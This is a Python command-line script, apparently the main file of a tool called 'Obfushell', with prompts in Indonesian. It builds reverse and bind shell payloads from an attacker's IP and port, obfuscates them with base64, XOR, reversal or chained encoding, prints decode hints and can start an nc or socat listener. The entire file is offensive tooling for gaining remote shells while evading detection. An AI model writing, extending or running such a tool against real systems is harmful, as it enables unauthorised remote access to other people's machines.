import argparse
import sys
from core.generator import generate_payload
from core.obfuscator import chain_encode, decode_hint
from core.listener import start_listener

def interactive_mode():
    print("[Obfushell] Payload Generator - Interactive Mode\n")
    payload_type = input("Pilih jenis payload (bash_reverse, python_reverse, perl_reverse, socat_reverse, socat_bind, ncat_reverse, ncat_bind): ")
    lhost = input("Masukkan IP Attacker (LHOST): ")
    lport = input("Masukkan Port (LPORT): ")

    payload = generate_payload(payload_type, lhost, lport)
    print(f"[+] Raw Payload:\n{payload}")

    obfuscation_method = input("Pilih metode obfuscation (base64, xor, reverse, chain): ")
    if obfuscation_method == "chain":
        methods = input("Masukkan metode chaining (base64, xor, reverse) dipisah dengan koma: ").split(",")
        obfuscated_payload = chain_encode(payload, methods)
        hint = decode_hint(methods)
    else:
        obfuscated_payload = chain_encode(payload, [obfuscation_method])
        hint = decode_hint([obfuscation_method])

    print(f"[+] Obfuscated Payload: \n{obfuscated_payload}")
    print(f"[+] Decode Hint: \n{hint}")

    listen = input("Ingin langsung memulai listener (y/n): ")
    if listen.lower() == "y":
        listener_tool = input("Pilih listener tool (nc/socat): ")
        start_listener(listener_tool, lport)

def quick_mode():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--type", required=True, help="Payload type: bash_reverse, python_reverse, perl_reverse, socat_reverse, socat_bind, ncat_reverse, ncat_bind")
    parser.add_argument("-l", "--lhost", required=True, help="LHOST (Attacker IP)")
    parser.add_argument("-p", "--lport", required=True, help="LPORT (Attacker Port)")
    parser.add_argument("-o", "--obfuscate", help="Obfuscation method: base64, xor, reverse, chain")
    parser.add_argument("--listen", action="store_true", help="Start listener automatically")
    args = parser.parse_args()

    payload = generate_payload(args.type, args.lhost, args.lport)
    print(f"[+] Raw Payload: \n{payload}")

    if args.obfuscate:
        obfuscated_payload = chain_encode(payload, [args.obfuscate])
        hint = decode_hint([args.obfuscate])
        print(f"[+] Obfuscated Payload: \n{obfuscated_payload}")
        print(f"[+] Decode Hint: \n{hint}")

    if args.listen:
        listener_tool = input("Pilih listener tool (nc/socat): ")
        start_listener(listener_tool, args.lport)

def main():
    print("[Obfushell] Linux Payload Crafter\n")
    print("1. Interactive Mode")
    print("2. Quick Mode")
    print("3. Exit\n")

    choice = input("Pilih opsi (1/2/3): ")
    if choice == "1":
        interactive_mode()
    elif choice == "2":
        quick_mode()
    else:
        sys.exit("[!] Exiting...")

if __name__ == "__main__":
    main()
